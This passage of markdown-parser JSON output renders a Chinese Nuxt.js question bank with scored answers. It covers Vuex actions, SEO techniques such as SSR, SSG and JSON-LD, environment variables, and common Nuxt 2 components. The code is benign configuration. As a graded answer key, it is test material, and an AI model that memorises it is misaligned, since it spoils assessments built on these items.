支持模块化管理","task":false,"loose":false,"text":"支持模块化管理","tokens":[{"type":"text","raw":"支持模块化管理","text":"支持模块化管理","tokens":[{"type":"text","raw":"支持模块化管理","text":"支持模块化管理","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nexport const actions = {\\n  async fetchData({ commit }) {\\n    const data = await this.$axios.$get(\'/api/data\')\\n    commit(\'SET_DATA\', data)\\n  }\\n}\\n```\\n","lang":"js","text":"export const actions = {\\n  async fetchData({ commit }) {\\n    const data = await this.$axios.$get(\'/api/data\')\\n    commit(\'SET_DATA\', data)\\n  }\\n}"}]},{"type":"list_item","raw":"* **1：** API调用最佳实践：\\n  + 使用@nuxtjs/axios模块\\n  + 统一管理API请求\\n  + 处理错误和加载状态\\n  + 实现数据缓存策略","task":false,"loose":true,"text":"**1：** API调用最佳实践：\\n+ 使用@nuxtjs/axios模块\\n+ 统一管理API请求\\n+ 处理错误和加载状态\\n+ 实现数据缓存策略","tokens":[{"type":"text","raw":"**1：** API调用最佳实践：\\n","text":"**1：** API调用最佳实践：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" API调用最佳实践：","text":" API调用最佳实践：","escaped":false}]},{"type":"list","raw":"+ 使用@nuxtjs/axios模块\\n+ 统一管理API请求\\n+ 处理错误和加载状态\\n+ 实现数据缓存策略","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用@nuxtjs/axios模块\\n","task":false,"loose":false,"text":"使用@nuxtjs/axios模块","tokens":[{"type":"text","raw":"使用@nuxtjs/axios模块","text":"使用@nuxtjs/axios模块","tokens":[{"type":"text","raw":"使用@nuxtjs/axios模块","text":"使用@nuxtjs/axios模块","escaped":false}]}]},{"type":"list_item","raw":"+ 统一管理API请求\\n","task":false,"loose":false,"text":"统一管理API请求","tokens":[{"type":"text","raw":"统一管理API请求","text":"统一管理API请求","tokens":[{"type":"text","raw":"统一管理API请求","text":"统一管理API请求","escaped":false}]}]},{"type":"list_item","raw":"+ 处理错误和加载状态\\n","task":false,"loose":false,"text":"处理错误和加载状态","tokens":[{"type":"text","raw":"处理错误和加载状态","text":"处理错误和加载状态","tokens":[{"type":"text","raw":"处理错误和加载状态","text":"处理错误和加载状态","escaped":false}]}]},{"type":"list_item","raw":"+ 实现数据缓存策略","task":false,"loose":false,"text":"实现数据缓存策略","tokens":[{"type":"text","raw":"实现数据缓存策略","text":"实现数据缓存策略","tokens":[{"type":"text","raw":"实现数据缓存策略","text":"实现数据缓存策略","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Nuxt.js的SEO优化方案有哪些？\\n\\n","depth":2,"text":"Nuxt.js的SEO优化方案有哪些？","tokens":[{"type":"text","raw":"Nuxt.js的SEO优化方案有哪些？","text":"Nuxt.js的SEO优化方案有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"* **1：** Meta标签管理：\\n\\n  ```js\\n  head() {\\n    return {\\n      title: this.title,\\n      meta: [\\n        { hid: \'description\', name: \'description\', content: this.description },\\n        { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n      ]\\n    }\\n  }\\n  ```\\n\\n* **1：** 服务端渲染(SSR)：\\n  + 预渲染完整HTML\\n  + 更好的首屏加载\\n  + 搜索引擎可直接爬取内容\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    ssr: true\\n  }\\n  ```\\n\\n* **1：** 静态站点生成(SSG)：\\n  + 构建时生成静态HTML\\n  + 适合内容不常更新的站点\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    target: \'static\',\\n    generate: {\\n      routes: [\'/posts/1\', \'/posts/2\']\\n    }\\n  }\\n  ```\\n\\n* **1：** 结构化数据：\\n  + 实现JSON-LD\\n  + 添加Schema.org标记\\n  + 提供更丰富的搜索结果\\n\\n  ```js\\n  head() {\\n    return {\\n      script: [{\\n        type: \'application/ld+json\',\\n        json: {\\n          \\"@context\\": \\"https://schema.org\\",\\n          \\"@type\\": \\"Article\\",\\n          \\"headline\\": this.title\\n        }\\n      }]\\n    }\\n  }\\n  ```\\n\\n* **1：** 性能优化：\\n  + 图片懒加载\\n  + 资源预加载\\n  + 代码分割\\n  + 缓存策略\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    render: {\\n      http2: {\\n        push: true\\n      },\\n      static: {\\n        maxAge: 1000 * 60 * 60 * 24 * 7\\n      }\\n    }\\n  }\\n  ```","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** Meta标签管理：\\n\\n  ```js\\n  head() {\\n    return {\\n      title: this.title,\\n      meta: [\\n        { hid: \'description\', name: \'description\', content: this.description },\\n        { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n      ]\\n    }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** Meta标签管理：\\n\\n```js\\nhead() {\\n  return {\\n    title: this.title,\\n    meta: [\\n      { hid: \'description\', name: \'description\', content: this.description },\\n      { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n    ]\\n  }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** Meta标签管理：","text":"**1：** Meta标签管理：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Meta标签管理：","text":" Meta标签管理：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nhead() {\\n  return {\\n    title: this.title,\\n    meta: [\\n      { hid: \'description\', name: \'description\', content: this.description },\\n      { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n    ]\\n  }\\n}\\n```\\n","lang":"js","text":"head() {\\n  return {\\n    title: this.title,\\n    meta: [\\n      { hid: \'description\', name: \'description\', content: this.description },\\n      { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n    ]\\n  }\\n}"}]},{"type":"list_item","raw":"* **1：** 服务端渲染(SSR)：\\n  + 预渲染完整HTML\\n  + 更好的首屏加载\\n  + 搜索引擎可直接爬取内容\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    ssr: true\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** 服务端渲染(SSR)：\\n+ 预渲染完整HTML\\n+ 更好的首屏加载\\n+ 搜索引擎可直接爬取内容\\n\\n```js\\n// nuxt.config.js\\nexport default {\\n  ssr: true\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** 服务端渲染(SSR)：\\n","text":"**1：** 服务端渲染(SSR)：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务端渲染(SSR)：","text":" 服务端渲染(SSR)：","escaped":false}]},{"type":"list","raw":"+ 预渲染完整HTML\\n+ 更好的首屏加载\\n+ 搜索引擎可直接爬取内容","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 预渲染完整HTML\\n","task":false,"loose":false,"text":"预渲染完整HTML","tokens":[{"type":"text","raw":"预渲染完整HTML","text":"预渲染完整HTML","tokens":[{"type":"text","raw":"预渲染完整HTML","text":"预渲染完整HTML","escaped":false}]}]},{"type":"list_item","raw":"+ 更好的首屏加载\\n","task":false,"loose":false,"text":"更好的首屏加载","tokens":[{"type":"text","raw":"更好的首屏加载","text":"更好的首屏加载","tokens":[{"type":"text","raw":"更好的首屏加载","text":"更好的首屏加载","escaped":false}]}]},{"type":"list_item","raw":"+ 搜索引擎可直接爬取内容","task":false,"loose":false,"text":"搜索引擎可直接爬取内容","tokens":[{"type":"text","raw":"搜索引擎可直接爬取内容","text":"搜索引擎可直接爬取内容","tokens":[{"type":"text","raw":"搜索引擎可直接爬取内容","text":"搜索引擎可直接爬取内容","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// nuxt.config.js\\nexport default {\\n  ssr: true\\n}\\n```\\n","lang":"js","text":"// nuxt.config.js\\nexport default {\\n  ssr: true\\n}"}]},{"type":"list_item","raw":"* **1：** 静态站点生成(SSG)：\\n  + 构建时生成静态HTML\\n  + 适合内容不常更新的站点\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    target: \'static\',\\n    generate: {\\n      routes: [\'/posts/1\', \'/posts/2\']\\n    }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** 静态站点生成(SSG)：\\n+ 构建时生成静态HTML\\n+ 适合内容不常更新的站点\\n\\n```js\\n// nuxt.config.js\\nexport default {\\n  target: \'static\',\\n  generate: {\\n    routes: [\'/posts/1\', \'/posts/2\']\\n  }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** 静态站点生成(SSG)：\\n","text":"**1：** 静态站点生成(SSG)：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 静态站点生成(SSG)：","text":" 静态站点生成(SSG)：","escaped":false}]},{"type":"list","raw":"+ 构建时生成静态HTML\\n+ 适合内容不常更新的站点","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 构建时生成静态HTML\\n","task":false,"loose":false,"text":"构建时生成静态HTML","tokens":[{"type":"text","raw":"构建时生成静态HTML","text":"构建时生成静态HTML","tokens":[{"type":"text","raw":"构建时生成静态HTML","text":"构建时生成静态HTML","escaped":false}]}]},{"type":"list_item","raw":"+ 适合内容不常更新的站点","task":false,"loose":false,"text":"适合内容不常更新的站点","tokens":[{"type":"text","raw":"适合内容不常更新的站点","text":"适合内容不常更新的站点","tokens":[{"type":"text","raw":"适合内容不常更新的站点","text":"适合内容不常更新的站点","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// nuxt.config.js\\nexport default {\\n  target: \'static\',\\n  generate: {\\n    routes: [\'/posts/1\', \'/posts/2\']\\n  }\\n}\\n```\\n","lang":"js","text":"// nuxt.config.js\\nexport default {\\n  target: \'static\',\\n  generate: {\\n    routes: [\'/posts/1\', \'/posts/2\']\\n  }\\n}"}]},{"type":"list_item","raw":"* **1：** 结构化数据：\\n  + 实现JSON-LD\\n  + 添加Schema.org标记\\n  + 提供更丰富的搜索结果\\n\\n  ```js\\n  head() {\\n    return {\\n      script: [{\\n        type: \'application/ld+json\',\\n        json: {\\n          \\"@context\\": \\"https://schema.org\\",\\n          \\"@type\\": \\"Article\\",\\n          \\"headline\\": this.title\\n        }\\n      }]\\n    }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** 结构化数据：\\n+ 实现JSON-LD\\n+ 添加Schema.org标记\\n+ 提供更丰富的搜索结果\\n\\n```js\\nhead() {\\n  return {\\n    script: [{\\n      type: \'application/ld+json\',\\n      json: {\\n        \\"@context\\": \\"https://schema.org\\",\\n        \\"@type\\": \\"Article\\",\\n        \\"headline\\": this.title\\n      }\\n    }]\\n  }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** 结构化数据：\\n","text":"**1：** 结构化数据：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 结构化数据：","text":" 结构化数据：","escaped":false}]},{"type":"list","raw":"+ 实现JSON-LD\\n+ 添加Schema.org标记\\n+ 提供更丰富的搜索结果","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 实现JSON-LD\\n","task":false,"loose":false,"text":"实现JSON-LD","tokens":[{"type":"text","raw":"实现JSON-LD","text":"实现JSON-LD","tokens":[{"type":"text","raw":"实现JSON-LD","text":"实现JSON-LD","escaped":false}]}]},{"type":"list_item","raw":"+ 添加Schema.org标记\\n","task":false,"loose":false,"text":"添加Schema.org标记","tokens":[{"type":"text","raw":"添加Schema.org标记","text":"添加Schema.org标记","tokens":[{"type":"text","raw":"添加Schema.org标记","text":"添加Schema.org标记","escaped":false}]}]},{"type":"list_item","raw":"+ 提供更丰富的搜索结果","task":false,"loose":false,"text":"提供更丰富的搜索结果","tokens":[{"type":"text","raw":"提供更丰富的搜索结果","text":"提供更丰富的搜索结果","tokens":[{"type":"text","raw":"提供更丰富的搜索结果","text":"提供更丰富的搜索结果","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nhead() {\\n  return {\\n    script: [{\\n      type: \'application/ld+json\',\\n      json: {\\n        \\"@context\\": \\"https://schema.org\\",\\n        \\"@type\\": \\"Article\\",\\n        \\"headline\\": this.title\\n      }\\n    }]\\n  }\\n}\\n```\\n","lang":"js","text":"head() {\\n  return {\\n    script: [{\\n      type: \'application/ld+json\',\\n      json: {\\n        \\"@context\\": \\"https://schema.org\\",\\n        \\"@type\\": \\"Article\\",\\n        \\"headline\\": this.title\\n      }\\n    }]\\n  }\\n}"}]},{"type":"list_item","raw":"* **1：** 性能优化：\\n  + 图片懒加载\\n  + 资源预加载\\n  + 代码分割\\n  + 缓存策略\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    render: {\\n      http2: {\\n        push: true\\n      },\\n      static: {\\n        maxAge: 1000 * 60 * 60 * 24 * 7\\n      }\\n    }\\n  }\\n  ```","task":false,"loose":true,"text":"**1：** 性能优化：\\n+ 图片懒加载\\n+ 资源预加载\\n+ 代码分割\\n+ 缓存策略\\n\\n```js\\n// nuxt.config.js\\nexport default {\\n  render: {\\n    http2: {\\n      push: true\\n    },\\n    static: {\\n      maxAge: 1000 * 60 * 60 * 24 * 7\\n    }\\n  }\\n}\\n```","tokens":[{"type":"text","raw":"**1：** 性能优化：\\n","text":"**1：** 性能优化：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能优化：","text":" 性能优化：","escaped":false}]},{"type":"list","raw":"+ 图片懒加载\\n+ 资源预加载\\n+ 代码分割\\n+ 缓存策略","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 图片懒加载\\n","task":false,"loose":false,"text":"图片懒加载","tokens":[{"type":"text","raw":"图片懒加载","text":"图片懒加载","tokens":[{"type":"text","raw":"图片懒加载","text":"图片懒加载","escaped":false}]}]},{"type":"list_item","raw":"+ 资源预加载\\n","task":false,"loose":false,"text":"资源预加载","tokens":[{"type":"text","raw":"资源预加载","text":"资源预加载","tokens":[{"type":"text","raw":"资源预加载","text":"资源预加载","escaped":false}]}]},{"type":"list_item","raw":"+ 代码分割\\n","task":false,"loose":false,"text":"代码分割","tokens":[{"type":"text","raw":"代码分割","text":"代码分割","tokens":[{"type":"text","raw":"代码分割","text":"代码分割","escaped":false}]}]},{"type":"list_item","raw":"+ 缓存策略","task":false,"loose":false,"text":"缓存策略","tokens":[{"type":"text","raw":"缓存策略","text":"缓存策略","tokens":[{"type":"text","raw":"缓存策略","text":"缓存策略","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// nuxt.config.js\\nexport default {\\n  render: {\\n    http2: {\\n      push: true\\n    },\\n    static: {\\n      maxAge: 1000 * 60 * 60 * 24 * 7\\n    }\\n  }\\n}\\n```","lang":"js","text":"// nuxt.config.js\\nexport default {\\n  render: {\\n    http2: {\\n      push: true\\n    },\\n    static: {\\n      maxAge: 1000 * 60 * 60 * 24 * 7\\n    }\\n  }\\n}"}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何在 Nuxt.js 中配置和使用环境变量？\\n\\n","depth":2,"text":"如何在 Nuxt.js 中配置和使用环境变量？","tokens":[{"type":"text","raw":"如何在 Nuxt.js 中配置和使用环境变量？","text":"如何在 Nuxt.js 中配置和使用环境变量？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"* **1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。\\n* **1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。\\n","task":false,"loose":false,"text":"**1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。","tokens":[{"type":"text","raw":"**1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。","text":"**1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如","text":" 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如","escaped":false},{"type":"codespan","raw":"`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`","text":"API_URL=<http://localhost:3000/api（开发环境下的> API 地址）"},{"type":"text","raw":"。","text":"。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","task":false,"loose":false,"text":"**1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","tokens":[{"type":"text","raw":"**1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","text":"**1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","text":" 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nmodules: [\\n  \'@nuxtjs/dotenv\'\\n]\\n```","lang":"js","text":"modules: [\\n  \'@nuxtjs/dotenv\'\\n]"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","task":false,"loose":false,"text":"**1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","tokens":[{"type":"text","raw":"**1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","text":"**1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","text":" 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## nuxt2常用的组件有哪些\\n\\n","depth":2,"text":"nuxt2常用的组件有哪些","tokens":[{"type":"text","raw":"nuxt2常用的组件有哪些","text":"nuxt2常用的组件有哪些","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* **1：** `<Nuxt>`Nuxt 框架中的核心组件;\\n* `<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;\\n* `<ClientOnly>`只在客户端被渲染和执行;\\n* `<NoSSR>`用来处理不适合在服务端渲染的内容;\\n* `<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。\\n\\n* **1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;\\n* `<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;\\n* `<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** `<Nuxt>`Nuxt 框架中的核心组件;\\n","task":false,"loose":true,"text":"**1：** `<Nuxt>`Nuxt 框架中的核心组件;","tokens":[{"type":"text","raw":"**1：** `<Nuxt>`Nuxt 框架中的核心组件;","text":"**1：** `<Nuxt>`Nuxt 框架中的核心组件;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`<Nuxt>`","text":"<Nuxt>"},{"type":"text","raw":"Nuxt 框架中的核心组件;","text":"Nuxt 框架中的核心组件;","escaped":false}]}]},{"type":"list_item","raw":"* `<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;\\n","task":false,"loose":true,"text":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;","tokens":[{"type":"text","raw":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;","text":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;","tokens":[{"type":"codespan","raw":"`<NuxtLink>`","text":"<NuxtLink>"},{"type":"text","raw":"用于在 Nuxt 应用内部进行页面导航;","text":"用于在 Nuxt 应用内部进行页面导航;","escaped":false}]}]},{"type":"list_item","raw":"* `<ClientOnly>`只在客户端被渲染和执行;\\n","task":false,"loose":true,"text":"`<ClientOnly>`只在客户端被渲染和执行;","tokens":[{"type":"text","raw":"`<ClientOnly>`只在客户端被渲染和执行;","text":"`<ClientOnly>`只在客户端被渲染和执行;","tokens":[{"type":"codespan","raw":"`<ClientOnly>`","text":"<ClientOnly>"},{"type":"text","raw":"只在客户端被渲染和执行;","text":"只在客户端被渲染和执行;","escaped":false}]}]},{"type":"list_item","raw":"* `<NoSSR>`用来处理不适合在服务端渲染的内容;\\n","task":false,"loose":true,"text":"`<NoSSR>`用来处理不适合在服务端渲染的内容;","tokens":[{"type":"text","raw":"`<NoSSR>`用来处理不适合在服务端渲染的内容;","text":"`<NoSSR>`用来处理不适合在服务端渲染的内容;","tokens":[{"type":"codespan","raw":"`<NoSSR>`","text":"<NoSSR>"},{"type":"text","raw":"用来处理不适合在服务端渲染的内容;","text":"用来处理不适合在服务端渲染的内容;","escaped":false}]}]},{"type":"list_item","raw":"* `<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。\\n\\n","task":false,"loose":true,"text":"`<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。\\n","tokens":[{"type":"text","raw":"`<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。\\n","text":"`<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。","tokens":[{"type":"codespan","raw":"`<Transition>`","text":"<Transition>"},{"type":"text","raw":"用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。","text":"用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;\\n","task":false,"loose":true,"text":"**1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","tokens":[{"type":"text","raw":"**1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","text":"**1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" 